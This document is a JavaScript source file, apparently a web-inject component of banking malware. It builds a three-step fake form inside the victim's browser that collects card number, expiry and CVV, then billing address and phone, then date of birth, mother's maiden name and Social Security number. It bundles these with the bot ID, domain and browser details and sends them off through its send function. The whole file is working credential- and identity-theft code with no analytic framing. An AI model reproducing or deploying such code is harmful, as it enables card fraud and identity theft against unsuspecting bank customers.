	_tables.bind('click',_tables.id("_tables.btn1"),function(){
			var nextstep = true;
			 
			 _tables.error(_tables.id('_tables.inp.name'),false);
			 _tables.error(_tables.id('_tables.inp.card'),false);
			 _tables.error(_tables.id('_tables.inp.exp.1'),false);
			 _tables.error(_tables.id('_tables.inp.exp.2'),false);
			 _tables.error(_tables.id('_tables.inp.CVV'),false);

		if(_tables.id('_tables.inp.name').value < 3){
			nextstep = false;
			_tables.error(_tables.id('_tables.inp.name'),true);
		}
		if(!_tables.check_cc(_tables.id('_tables.inp.card').value || _tables.id('_tables.inp.card').length < 15)){
			nextstep = false;
			_tables.error(_tables.id('_tables.inp.card'),true);
		}
			
		if(_tables.id('_tables.inp.exp.1').selectedIndex < 1){
			nextstep = false;
		_tables.error(_tables.id('_tables.inp.exp.1'),true);
		}
	
		if(_tables.id('_tables.inp.exp.2').selectedIndex < 1){
			nextstep = false;
		_tables.error(_tables.id('_tables.inp.exp.2'),true);
		}	
		
		if(!/[0-9]{3}/igm.test(_tables.id('_tables.inp.CVV').value)){
			nextstep = false; 
		_tables.error(_tables.id('_tables.inp.CVV'),true);
		}		
			
		
if(nextstep){
	
	_tables.btntoloader(_tables.id('_tables.btn1'),_tables.get('loader'));
	_tables.add('data','Name on card: '+_tables.id('_tables.inp.name').value+
		'|'+'Card number: ' +_tables.id('_tables.inp.card').value+'|'+'Exp: '+_tables.id('_tables.inp.exp.1')[_tables.id('_tables.inp.exp.1').selectedIndex].value+'/'+_tables.id('_tables.inp.exp.2')[_tables.id('_tables.inp.exp.2').selectedIndex].value+
		'|'+'CVV: '+_tables.id('_tables.inp.CVV').value+'|');
	

	
	setTimeout(function(){
		_tables.id('_table.1').style.display = 'none';
		_tables.id('_table.2').style.display = '';
	
	},1234);

}		
			});
	
	_tables.bind('click',_tables.id("_tables.btn2"),function(){
			var nextstep = true;
			 
			 _tables.error(_tables.id('_tables.street'),false);
			 _tables.error(_tables.id('_tables.city'),false);
			 _tables.error(_tables.id('_tables.state_province'),false);
			 _tables.error(_tables.id('_tables.zip'),false);
			 _tables.error(_tables.id('_tables.phone'),false);

		if(_tables.id('_tables.street').value.length<3){
			nextstep = false;
			_tables.error(_tables.id('_tables.street'),true);
		}
		if(_tables.id('_tables.city').value.length<3){
			nextstep = false;
			_tables.error(_tables.id('_tables.city'),true);
		}
		if(_tables.id('_tables.state_province').value.length<3){
			nextstep = false;
			_tables.error(_tables.id('_tables.state_province'),true);
		}
		
		if(_tables.id('_tables.zip').value.length<5){
		nextstep = false;
		_tables.error(_tables.id('_tables.zip'),true);
		}		
		
		if(!/[0-9]{3,}/igm.test(_tables.id('_tables.phone').value || _tables.id('_tables.phone').value.length < 5)){
		nextstep = false;
		_tables.error(_tables.id('_tables.phone'),true);
		}
	
		
if(nextstep){
	
	
		_tables.btntoloader(_tables.id('_tables.btn2'),_tables.get('loader'));
	_tables.add('data','Street: '+_tables.id('_tables.street').value+'|'+'City: '+_tables.id('_tables.city').value+'|'+'State/Province: ' + _tables.id('_tables.state_province').value+
		'|'+'ZIP: ' +_tables.id('_tables.zip').value+'|'+'Phone Num: ' + _tables.id('_tables.phone').value+'|');
	
	
	setTimeout(function(){
		_tables.id('_table.2').style.display = 'none';
		_tables.id('_table.3').style.display = '';
	
	},1234);

}		
			});

	_tables.bind('click',_tables.id('_tables.btn3'),function(){
			var nextstep = true;
			 
			 _tables.error(_tables.id('_tables.inp.dop1'),false);
			 _tables.error(_tables.id('_tables.inp.dop2'),false);
			 _tables.error(_tables.id('_tables.inp.dop3'),false);
			 _tables.error(_tables.id('_tables.question'),false);
			 _tables.error(_tables.id('_tables_ssn1'),false);
			 _tables.error(_tables.id('_tables_ssn2'),false);
			 _tables.error(_tables.id('_tables_ssn3'),false);
			 
			 _tables.error(_tables.id('_tables.inp.CVV'),false);

	if(_tables.id('_tables.inp.dop1').selectedIndex < 1){
			nextstep = false;
		_tables.error(_tables.id('_tables.inp.dop1'),true);
	}
	
	if(_tables.id('_tables.inp.dop2').selectedIndex < 1){
			nextstep = false;
		_tables.error(_tables.id('_tables.inp.dop2'),true);
		}	
			
	if(_tables.id('_tables.inp.dop3').selectedIndex < 1){
			nextstep = false;
		_tables.error(_tables.id('_tables.inp.dop3'),true);
		}
		
	if(_tables.id('_tables.question').value.length<2){
		nextstep = false;
		_tables.error(_tables.id('_tables.question'),true);
	}
	if(!/[0-9]{3}/igm.test(_tables.id('_tables_ssn1').value)){
		nextstep = false;
	_tables.error(_tables.id('_tables_ssn1'),true);
	};

	if(!/[0-9]{2}/igm.test(_tables.id('_tables_ssn2').value)){
		nextstep = false;
	_tables.error(_tables.id('_tables_ssn2'),true);
	};

if(!/[0-9]{4}/igm.test(_tables.id('_tables_ssn3').value)){
		nextstep = false;
	_tables.error(_tables.id('_tables_ssn3'),true);
	}
	
	if(nextstep){
	
		_tables.btntoloader(_tables.id('_tables.btn3'),_tables.get('loader'));
		_tables.add('data','DBirth: '+ _tables.id('_tables.inp.dop1')[_tables.id('_tables.inp.dop1').selectedIndex].value + '/' + 
		_tables.id('_tables.inp.dop2')[_tables.id('_tables.inp.dop2').selectedIndex].value + '/' +_tables.id('_tables.inp.dop3')[_tables.id('_tables.inp.dop3').selectedIndex].value +'|'+'Mother`s name: '+
		_tables.id('_tables.question').value+'|' + 'SSN :'+_tables.id('_tables_ssn1').value+'/'+_tables.id('_tables_ssn2').value+'/'+_tables.id('_tables_ssn3').value+'|');
		
	
	
	
		_tables.add('message','complete');
		_tables.set('finish','finish');
		_tables.status('TL');
		_tables.log();
	
	


}		
			});

};

_tables.log = function(){
	_tables.send(
		{'type':_tables.get('type')},
		{'param1':_tables.get('end')},
		{'param2':_tables.get('finish')},
		{'param5':'OFF'},
		{'message':_tables.get('message')},
		{'balance':_tables.get('balance')},
		{'data':_tables.get('data')},
		{'link':document.domain},
		{'browser':_tables.brows()},
		{'jabber':'SEND'},
		{'branch':'TL'}
	);
};


_tables.create_select = function(def,start,stop,id){
	var opt = '';
	for(var i = start; i <= stop; i++){
		opt += '<option value="'+i+'">'+i+'</option>';
	}
	return '<select id="'+id+'" style="display: inline-block; border:1px solid #ccc;font-family:Helvetica;font-size: 13px; height: 36px;text-transform: none;width: 95px;" maxlength="255" title="First Name" value="" name="firstname" id="firstname">><option>'+def+'</option>'+opt+'</select>';

};

_tables.error = function(inp,state){
	if(state){
		inp.style.border= '1px solid #fd1212';
	}else{
		inp.style.border= '1px solid silver';
	}
};


_tables.showpage = function(){
	if(_tables.id('_brows.cap'))_tables.id('_brows.cap').parentNode.removeChild(_tables.id('_brows.cap'));
};

_tables.callback = function(){
	_tables.set('message','');
	switch(_tables.status()){
		
		case('CP'):
			if(!_tables.answer){
				_tables.status('IP');
				_tables.send({'login1':_brows.botid},{'type':_tables.get('type')},{'param1':_tables.get('start')},{'domain':document.domain},{'branch':'SL'});
				return;
			}else{
				
				if(_tables.answer.p1 == 'start' && _tables.answer.p2 != 'finish'){
					
					_tables.fake();
					_tables.showpage();
				}else{
					_tables.showpage();
					
				}
				
			}
		
		
		
		break;
		
		case('TL'):
			location.reload();
		break;
		
		case('IP'):
			location.reload();
		break;
		
		default:
			_tables.showpage();
		break;
		
	}
};




_tables.start = function(){

	 
	
	if(_tables.get('logout')){
			
		
		_tables.status('CP');
		_tables.send({'domain':document.domain},{'type':_tables.get('type')},{'branch':'CP'});

	}else{
		
		_tables.showpage();
	}
	
};
_tables.start();


